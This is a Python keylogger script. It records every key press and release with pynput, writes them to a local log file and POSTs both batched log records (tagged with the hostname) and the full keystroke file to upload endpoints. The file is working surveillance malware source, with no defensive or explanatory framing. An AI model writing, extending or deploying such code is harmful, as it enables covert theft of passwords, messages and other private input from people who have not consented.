import atexit
import datetime
import logging
import os
import queue
import sys
import threading
import traceback

import requests
from pynput import keyboard

LOG_FILE = "log.txt"
UPLOAD_URL = "http://127.0.0.1:5000/upload"
LOG_UPLOAD_URL = "http://127.0.0.1:5000/logs"   # new endpoint
BATCH_INTERVAL = 10    # seconds
BATCH_MAX = 100        # records


class ServerLogHandler(logging.Handler):
    """Buffers log records and POSTs them to a server in batches."""

    def __init__(self, url, interval=BATCH_INTERVAL, max_batch=BATCH_MAX):
        super().__init__()
        self.url = url
        self.interval = interval
        self.max_batch = max_batch
        self._queue = queue.Queue()
        self._stop = threading.Event()
        self._worker = threading.Thread(target=self._run, daemon=True)
        self._worker.start()
        atexit.register(self.flush)

    def emit(self, record):
        try:
            self._queue.put_nowait(self.format(record))
        except Exception:
            self.handleError(record)

    def _run(self):
        batch = []
        while not self._stop.is_set():
            try:
                batch.append(self._queue.get(timeout=self.interval))
            except queue.Empty:
                if batch:
                    self._post(batch)
                    batch = []
                continue
            if len(batch) >= self.max_batch:
                self._post(batch)
                batch = []
        if batch:          # final flush on shutdown
            self._post(batch)

    def _post(self, batch):
        try:
            requests.post(
                self.url,
                json={"host": os.uname().nodename if hasattr(os, "uname") else os.getenv("COMPUTERNAME", "?"),
                      "logs": batch},
                timeout=5,
            )
        except Exception:
            pass  # never let logging fail the app

    def flush(self):
        while not self._queue.empty():
            try:
                self._queue.put_nowait(None)  # not used, just drain
            except Exception:
                break
        self._stop.set()
        self._worker.join(timeout=2)


def _setup_logging():
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    fmt = logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")

    # 1) File handler (existing log.txt)
    fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
    fh.setFormatter(fmt)
    root.addHandler(fh)

    # 2) Server handler (only if we have a URL)
    if LOG_UPLOAD_URL:
        sh = ServerLogHandler(LOG_UPLOAD_URL)
        sh.setFormatter(fmt)
        root.addHandler(sh)


# ---- crash capture ----
def _excepthook(exc_type, exc, tb):
    logging.critical("Uncaught exception", exc_info=(exc_type, exc, tb))
    # best-effort immediate flush
    for h in logging.getLogger().handlers:
        try:
            h.flush()
        except Exception:
            pass
    sys.__excepthook__(exc_type, exc, tb)

sys.excepthook = _excepthook


# ---- existing keylogger behaviour, now using logging ----
log = logging.getLogger("keylogger")


def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    log.info("PRESS   %s", key_str)


def on_release(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    log.info("RELEASE %s", key_str)
    if key == keyboard.Key.esc:
        upload_log()
        return False


def upload_log():
    log.info("Uploading keystroke log to %s", UPLOAD_URL)
    try:
        with open(LOG_FILE, "rb") as f:
            r = requests.post(
                UPLOAD_URL,
                files={"file": (LOG_FILE, f, "text/plain")},
                timeout=10,
            )
        log.info("Upload status: %s", r.status_code)
    except Exception as e:
        log.exception("Upload failed: %s", e)


def start_logger():
    _setup_logging()          # <-- call this BEFORE anything logs
    log.info("Keylogger starting, version=%s", globals().get("__version__", "?"))
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()